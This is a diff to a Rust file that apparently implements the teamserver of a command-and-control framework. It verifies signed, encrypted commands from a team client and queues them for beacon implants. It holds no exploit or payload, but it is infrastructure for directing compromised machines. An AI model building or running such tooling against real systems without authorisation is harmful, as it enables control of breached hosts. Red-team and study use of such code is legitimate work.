@@ -17,19 +17,33 @@
 // LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 // OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 // SOFTWARE.
-
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 use actix_web::{web, App, HttpServer, HttpResponse, HttpRequest, Responder};
-use log::info;
+use log::{debug, error, info};
 use rsa::RsaPrivateKey;
+use lazy_static::lazy_static;
+use std::sync::Mutex;
 
+use crate::utilities::Utils;
 use crate::encryption::rsa::Rsa;
 use crate::encryption::aes::Aes;
 use crate::encoding::base64::Base64;
 use crate::keys::Keys;
+use crate::utilities::beacondecoder::BeaconDecoder;
 
 pub struct ManagementServer;
 pub struct Listener;
+
+// Define a structure to hold the stored data
+#[derive(Default)]
+struct Commands {
+    commands: Vec<(String, String)>
+}
+
+// Initialize a lazy_static Mutex to store the queue'd commands
+lazy_static! {
+    static ref QUEUE: Mutex<Commands> = Mutex::new(Commands::default());
+}
 
 impl ManagementServer {
     pub async fn start(ip: String, port: u64, username: String, password: String, private_key: RsaPrivateKey) -> std::io::Result<()> {
@@ -68,30 +82,25 @@ impl ManagementServer {
             // Using the Public key of the teamclient we verify the authenticity and integrity of a command
             
             "queue" => {
-                if body.len() > 0 && body.contains(":") {
-                    let msg: Vec<&str> = body.split(":").collect();
 
-                    if msg.len() >= 3 {
-                        let encrypted_data = Base64::decode(msg[0]).to_vec();
-                        let encrypted_key = Base64::decode(msg[1]).to_vec();
-                        let signature = Base64::decode(msg[2]);
+                // Firstly verify the message is from the teamclient
+                if let Err(e) = verify_teamclient_msg(body.clone()) {
+                    error!("{}", e);
+                    return HttpResponse::InternalServerError().into();
+                }
 
-                        // Loading the public key of the teamclient
-                        if let Ok(pubkey_location) = Keys::get_key_location("public_key_teamclient") {
-                            if let Ok(teamclient_public_key) = Rsa::load_public_key(&pubkey_location) {
+                if let Ok((encrypted_data, encrypted_key, _)) = retrieve_queue_info(body.clone()) {
+                    if let Ok(decrypted_key) = Rsa::decrypt(private_key.get_ref().clone(), encrypted_key) {
+                        let decrypted_command = Aes::decrypt(Aes::transform(decrypted_key), encrypted_data);
 
-                                if Rsa::verify(teamclient_public_key, encrypted_key.clone(), &signature) {
-                                    info!("Teamclient sent job, verified signature of msg");
+                        if let Ok(command) = Utils::convert(&decrypted_command) {
 
-                                    if let Ok(decrypted_key) = Rsa::decrypt(private_key.get_ref().clone(), encrypted_key) {
-                                        let decrypted_command = Aes::decrypt(Aes::transform(decrypted_key), encrypted_data);
-                                        if let Ok(command) = std::str::from_utf8(&decrypted_command) {
-                                            
-                                            // Insert logic for pushing the command to the queue
-                                            
-                                        }
-                                    }
-                                }
+                            // Logic for pushing the command to the queue
+                            if let Ok(mut queue) = QUEUE.lock() {
+                                let beacon = BeaconDecoder::new(command.to_string());
+                                debug!("Added a command for beacon: {}", beacon.id());
+                                queue.commands.push((beacon.id(), beacon.res()));
+                                debug!("Length of queue: {}", queue.commands.len());
                             }
                         }
                     }
@@ -100,7 +109,7 @@ impl ManagementServer {
             "listener" => {
                 // API call for starting a listener
 
-                
+                    
             },
             _ => return HttpResponse::InternalServerError().into(),
         };
@@ -172,6 +181,34 @@ impl ManagementServer {
 
         HttpResponse::InternalServerError().into()
     }
+}
+
+fn retrieve_queue_info(body: String) -> Result<(Vec<u8>, Vec<u8>, Vec<u8>)> {
+    if body.len() > 0 && body.contains(":") {
+        let msg: Vec<&str> = body.split(":").collect();
+
+        if msg.len() >= 3 {
+            let encrypted_data = Base64::decode(msg[0]).to_vec();
+            let encrypted_key = Base64::decode(msg[1]).to_vec();
+            let signature = Base64::decode(msg[2]);
+
+            return Ok((encrypted_data, encrypted_key, signature))
+        }
+    }
+
+    // Log the error to terminal
+    error!("Malformed queue information");
+    Err(anyhow!("Malformed queue information"))
+}
+
+fn verify_teamclient_msg(body: String) -> Result<bool> {
+    // Verify a HTTP body is from the teamclient
+    let (_, encrypted_key, signature) = retrieve_queue_info(body)?;
+    let teamclient_pubkey = Rsa::load_public_key("public_key_teamclient")?;
+    if Rsa::verify(teamclient_pubkey, encrypted_key, &signature) {
+        return Ok(true);
+    }
+    Err(anyhow!("Verification failed"))
 }
 
 impl Listener {
